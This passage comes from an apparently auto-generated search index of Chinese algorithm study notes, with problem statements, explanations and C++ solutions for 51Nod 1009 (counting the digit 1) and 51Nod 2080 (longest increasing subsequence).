\u6570\u5b571\u7684\u6570\u91cf"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#_1","text":"51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5341\u8fdb\u5236\u6b63\u6574\u6570 N \uff0c\u5199\u4e0b\u4ece1\u5f00\u59cb\uff0c\u5230 N \u7684\u6240\u6709\u6b63\u6570\uff0c\u8ba1\u7b97\u51fa\u5176\u4e2d\u51fa\u73b0\u6240\u67091\u7684\u4e2a\u6570\u3002 \u4f8b\u5982\uff1a n = 12 \uff0c\u5305\u542b\u4e865\u4e2a1\u30021,10,12\u5171\u5305\u542b3\u4e2a1\uff0c11\u5305\u542b2\u4e2a1\uff0c\u603b\u51715\u4e2a1\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#13-input","text":"\u8f93\u5165 N(1 \\le N \\le 10^9)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#14-output","text":"\u8f93\u51fa\u5305\u542b1\u7684\u4e2a\u6570","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#15-sample-input","text":"12","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#16-sample-output","text":"5","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#17-source","text":"51Nod 1009 \u6570\u5b571\u7684\u6570\u91cf","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#2","text":"\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\uff0c\u4f9d\u6b21\u8003\u8651\u6bcf\u4e00\u6570\u4f4d\u4e3a1\u65f6\uff0c\u5176\u4ed6\u7684\u6570\u4f4d\u80fd\u591f\u53d6\u591a\u5c11\u79cd\u60c5\u51b5\u3002 \u5b9a\u4e49\u4ee5\u4e0b\u7b26\u53f7\uff1a pos : \u6570\u4f4d posNum : \u6570\u4f4d\u4e0a\u7684\u6570\u5b57 posScale : \u5f53\u524d\u6570\u4f4d\u4ee3\u8868\u7684\u6570\u91cf\u7ea7\uff0c posScale = 10^{pos} left : \u5de6\u8fb9\u7684\u6570\u4f4d right : \u53f3\u8fb9\u7684\u6570\u4f4d current : \u5f53\u524d\u8ba1\u6570 ans : \u7d2f\u8ba1\u8ba1\u6570 \u5224\u65ad\u6709\u591a\u5c11\u79cd\u60c5\u51b5\u7684\u65b9\u6cd5\u5982\u4e0b\uff1a \u82e5\u5f53\u524d\u6570\u4f4d\u5927\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left] \u5171 (left + 1) \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, 10^{pos} - 1] \u5171 posScale \u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a (left + 1) \\times posScale \u82e5\u5f53\u524d\u6570\u4f4d\u7b49\u4e8e0\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left) \u5171 left \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 posScale \u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a left \\times posScale \u82e5\u5f53\u524d\u6570\u4f4d\u7b49\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 \u5de6\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 left \u79cd\u60c5\u51b5 \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0c\u5171 posScale \u79cd\u60c5\u51b5 \u8fd8\u8981\u52a0\u4e0a\u5de6\u8fb9\u6570\u4f4d\u53d6 left \uff0c\u5f53\u524d\u6570\u4f4d\u53d61\uff0c\u53f3\u8fb9\u7684\u6570\u4f4d\u53d6 [0, right] \u7684\u60c5\u51b5 \u5982\u8ba1\u7b97123\u65f6\uff0c\u8981\u8003\u8651 [100, 123] \u8fd9\u91cc\u768424\u79cd\u60c5\u51b5 \u5f53\u524d\u7684\u60c5\u51b5\u8ba1\u6570\u4e3a left \\times posScale + right + 1 \u4ee5 N = 123 \u4e3a\u4f8b pos posNum posScale left right current ans 0 3 1 12 0 13 13 1 2 10 1 3 20 33 2 1 100 0 23 24 57 \u5f97\u5230\u7684\u7b54\u6848\u4e3a57","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.51Nod_1009_%E6%95%B0%E5%AD%971%E7%9A%84%E6%95%B0%E9%87%8F/#3","text":"#include <iostream> using namespace std; int Cal(int n) { // \u5b58\u50a8\u8ba1\u6570 int ans = 0; // \u53d6\u6570\u4f4d\uff0c\u4ece\u4e2a\u4f4d\u5f00\u59cb\u53d6\u5230\u6700\u9ad8\u4f4d int pos = 0; // \u5f53\u524d\u6570\u4f4d\u4ee3\u8868\u7684\u6570\u91cf\u7ea7\uff0cposScale = 10^pos int posScale = 1; int posNum = 0, left = 0, right = 0; while (n / posScale) { // posNum\uff0c\u5f53\u524d\u6570\u4f4d\u7684\u6570\u5b57 posNum = (n / posScale) % 10; // \u5f53\u524d\u6570\u4f4d\u5de6\u8fb9\u6240\u6709\u6570\u4f4d\u4e0a\u7684\u6570\u5b57 left = n / (posScale * 10); // \u5f53\u524d\u6570\u4f4d\u53f3\u8fb9\u6240\u6709\u6570\u4f4d\u4e0a\u7684\u6570\u5b57 right = n % posScale; // \u5224\u65ad\u5f53\u524d\u6570\u4f4d\u4e0a\u7684\u503c if (posNum > 1) { // \u82e5\u5927\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left] \u5171 (left + 1) \u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, 10^pos - 1] \u5171 posScale \u79cd\u60c5\u51b5 ans += (left + 1) * posScale; } else if (posNum == 0) { // \u82e5\u7b49\u4e8e0\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u53ef\u4ee5\u53d6 [0, left) \u5171 (left) \u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cposScale \u79cd\u60c5\u51b5 ans += left * posScale; } else if (posNum == 1) { // \u82e5\u7b49\u4e8e1\uff0c\u5219\u5c06\u5f53\u524d\u6570\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6 // \u5de6\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cleft\u79cd\u60c5\u51b5 // \u53f3\u8fb9\u7684\u6570\u4f4d\u540c\u4e0a\uff0cposScale \u79cd\u60c5\u51b5 // \u8fd8\u8981\u52a0\u4e0a\u5de6\u8fb9\u6570\u4f4d\u53d6left\uff0c\u5f53\u524d\u6570\u4f4d\u53d61\uff0c\u53f3\u8fb9\u7684\u6570\u4f4d\u53d6[0, right]\u7684\u60c5\u51b5 // \u5982\u8ba1\u7b97123\u65f6\uff0c\u8981\u8003\u8651[100, 123]\u8fd9\u91cc\u768424\u79cd\u60c5\u51b5 ans += left * posScale + right + 1; } // \u53d6\u4e0b\u4e00\u4e2a\u6570\u4f4d pos++; posScale *= 10; } return ans; } int main() { int n; while (cin >> n) { cout << Cal(n) << endl; } return 0; } \u8fd8\u6709\u4e00\u79cd\u52a8\u6001\u89c4\u5212\u65b9\u6cd5\uff0c\u53c2\u8003\u81ea \u53e6\u4e00\u4f4d\u535a\u4e3b\u7684\u535a\u5ba2 #include<iostream> #include<cstring> #include<cstdio> using namespace std; typedef long long ll; const int maxn = 20; ll dp[maxn][maxn], a[maxn]; ll dfs(int pos, int num, int limit) { if(pos == -1) return num; if(!limit && dp[pos][num] != -1) return dp[pos][num]; int up = limit ? a[pos] : 9; ll tmp = 0; for(int i = 0; i <= up; i++) tmp += dfs(pos-1, num+(i==1), limit && i == a[pos]); if(!limit) dp[pos][num] = tmp; return tmp; } ll solve(ll x) { int pos = 0; while(x) { a[pos++] = x%10; x /= 10; } return dfs(pos-1, 0, 1); } int main(void) { ll n; memset(dp, -1, sizeof(dp)); while(cin >> n) printf(\"%lld\\n\", solve(n)); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/","text":"51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217 # \u76ee\u5f55 # 51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u4e00\u4e2a\u6570\u5217\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5217\uff0c\u662f\u6307\u5176\u6240\u6709\u9012\u589e\u7684\u5b50\u5217\u4e2d\u6700\u957f\u7684\u4e00\u4e2a\u5b50\u5217 \u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u5217 a_n \uff0c\u6c42\u8fd9\u4e2a\u6570\u5217\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5217\u7684\u957f\u5ea6 \u4f8b\u5982\u5bf9\u6570\u5217 1 7 2 8 3 4\uff0c\u8fd9\u4e2a\u6570\u5217\u7684\u6700\u957f\u9012\u589e\u5b50\u6570\u5217\u662f 1 2 3 4\uff0c\u957f\u5ea6\u4e3a 4\uff1b\u6b21\u957f\u7684\u957f\u5ea6\u4e3a 3\uff0c \u5305\u62ec 1 7 8\u30011 2 3 \u7b49\u3002 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6b63\u6574\u6570 n \uff0c\u8868\u793a\u6570\u5217\u5143\u7d20\u4e2a\u6570\uff0c n \\le 1000 \u7b2c\u4e8c\u884c n \u4e2a\u6b63\u6574\u6570\uff0c\u4ece\u5de6\u5230\u53f3\u7ed9\u51fa\u6570\u5217\u7684\u6bcf\u4e00\u9879 1.4. Output # \u4e00\u884c\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u8868\u793a\u6700\u957f\u4e0a\u5347\u5b50\u6570\u5217\u7684\u957f\u5ea6 1.5. Sample Input # 8 5 1 6 8 2 4 5 10 1.6. Sample Output # 5 1.7. Source # 51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217 2. \u89e3\u8bfb # \u901a\u8fc7\u52a8\u6001\u89c4\u5212\u6c42\u89e3\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u3002 \u5b9a\u4e49\u72b6\u6001 dp[i] \uff0c\u8868\u793a\u4ee5\u7b2c i \u4e2a\u6570\u4e3a\u7ed3\u5c3e\u7684\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\uff0c\u90a3\u4e48\uff1a dp[i] = \\max\\{0, dp[j]\\} + 1 \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 0 < j <i A_j < A_i A_j \u548c A_i \u8868\u793a\u5e8f\u5217\u4e2d\u7b2c j \u548c\u7b2c i \u4e2a\u6570\u7684\u6570\u503c 1 \u3002 \u6700\u540e\u7b54\u6848\u4e3a \\max\\{ dp[i] \\} 3. \u4ee3\u7801 # #include <iostream> using namespace std; #define MAXN 1001 int n, list[MAXN]; // \u6c42\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6 int LIS() { int ans = 1; int dp[MAXN]; dp[1] = 1; // \u5bf9\u6240\u6709\u6570\u8fdb\u884c\u5faa\u73af for (int i = 0; i <= n; i++) { int max = 0; // \u5bf9\u6240\u6709\u5c0f\u4e8ei\u7684\u6570\u8fdb\u884c\u5faa\u73af for (int j = 1; j < i; j++) { // \u82e5\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6700\u5927\u503c if (dp[j] > max && list[j] < list[i]) { // \u8bb0\u5f55\u6700\u5927\u503c max = dp[j]; } } // \u5c06\u5f53\u524d\u904d\u5386\u7684\u6570\u4f4d\u8ba1\u7b97\u5728\u5185\uff0c\u5f53\u524d\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6\u4e3amax + 1 dp[i] = max + 1; if (dp[i] > ans) { ans = dp[i]; } } return ans; } int main() { while (cin >> n) { for (int i = 1; i <= n; i++) { cin >> list[i]; } cout << LIS() << endl; } return 0; } 4. \u53c2\u8003\u6587\u732e # [1] \u7f57\u52c7\u519b, \u90ed\u536b\u658c. \u7b97\u6cd5\u7ade\u8d5b\u5165\u95e8\u5230\u8fdb\u9636 [M]. \u5317\u4eac: \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2019. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#51nod-2080","text":"","title":"51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#_1","text":"51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#12-problem-description","text":"\u4e00\u4e2a\u6570\u5217\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5217\uff0c\u662f\u6307\u5176\u6240\u6709\u9012\u589e\u7684\u5b50\u5217\u4e2d\u6700\u957f\u7684\u4e00\u4e2a\u5b50\u5217 \u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u5217 a_n \uff0c\u6c42\u8fd9\u4e2a\u6570\u5217\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5217\u7684\u957f\u5ea6 \u4f8b\u5982\u5bf9\u6570\u5217 1 7 2 8 3 4\uff0c\u8fd9\u4e2a\u6570\u5217\u7684\u6700\u957f\u9012\u589e\u5b50\u6570\u5217\u662f 1 2 3 4\uff0c\u957f\u5ea6\u4e3a 4\uff1b\u6b21\u957f\u7684\u957f\u5ea6\u4e3a 3\uff0c \u5305\u62ec 1 7 8\u30011 2 3 \u7b49\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6b63\u6574\u6570 n \uff0c\u8868\u793a\u6570\u5217\u5143\u7d20\u4e2a\u6570\uff0c n \\le 1000 \u7b2c\u4e8c\u884c n \u4e2a\u6b63\u6574\u6570\uff0c\u4ece\u5de6\u5230\u53f3\u7ed9\u51fa\u6570\u5217\u7684\u6bcf\u4e00\u9879","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#14-output","text":"\u4e00\u884c\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u8868\u793a\u6700\u957f\u4e0a\u5347\u5b50\u6570\u5217\u7684\u957f\u5ea6","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#15-sample-input","text":"8 5 1 6 8 2 4 5 10","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#16-sample-output","text":"5","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#17-source","text":"51Nod 2080 \u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#2","text":"\u901a\u8fc7\u52a8\u6001\u89c4\u5212\u6c42\u89e3\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u3002 \u5b9a\u4e49\u72b6\u6001 dp[i] \uff0c\u8868\u793a\u4ee5\u7b2c i \u4e2a\u6570\u4e3a\u7ed3\u5c3e\u7684\u6700\u957f\u9012\u589e\u5b50\u5e8f\u5217\u7684\u957f\u5ea6\uff0c\u90a3\u4e48\uff1a dp[i] = \\max\\{0, dp[j]\\} + 1 \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 0 < j <i A_j < A_i A_j \u548c A_i \u8868\u793a\u5e8f\u5217\u4e2d\u7b2c j \u548c\u7b2c i \u4e2a\u6570\u7684\u6570\u503c 1 \u3002 \u6700\u540e\u7b54\u6848\u4e3a \\max\\{ dp[i] \\}","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#3","text":"#include <iostream> using namespace std; #define MAXN 1001 int n, list[MAXN]; // \u6c42\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6 int LIS() { int ans = 1; int dp[MAXN]; dp[1] = 1; // \u5bf9\u6240\u6709\u6570\u8fdb\u884c\u5faa\u73af for (int i = 0; i <= n; i++) { int max = 0; // \u5bf9\u6240\u6709\u5c0f\u4e8ei\u7684\u6570\u8fdb\u884c\u5faa\u73af for (int j = 1; j < i; j++) { // \u82e5\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6700\u5927\u503c if (dp[j] > max && list[j] < list[i]) { // \u8bb0\u5f55\u6700\u5927\u503c max = dp[j]; } } // \u5c06\u5f53\u524d\u904d\u5386\u7684\u6570\u4f4d\u8ba1\u7b97\u5728\u5185\uff0c\u5f53\u524d\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6\u4e3amax + 1 dp[i] = max + 1; if (dp[i] > ans) { ans = dp[i]; } } return ans; } int main() { while (cin >> n) { for (int i = 1; i <= n; i++) { cin >> list[i]; } cout << LIS() << endl; } return 0; }","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/2.51Nod_2080_%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#4","text":"[1] \u7f57\u52c7\u519b, \u90ed\u536b\u658c. \u7b97\u6cd5\u7ade\u8d5b\u5165\u95e8\u5230\u8fdb\u9636 [M]. \u5317\u4eac: \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2019. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205036_%E7%AD%94%E9%A2%98%E5%8D%A1/","text":"\u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361 \u52a8\u6001\u89c4\u5212 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC205036 \u7b54\u9898\u5361 \u52a8\u6001\u89c4\u5212 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u725b\u725b\u5373\u5c06\u8981\u53c2\u52a0\u8003\u8bd5\uff0c\u4ed6\u5b66\u4f1a\u4e86\u586b\u7b54\u9898\u5361\u3002 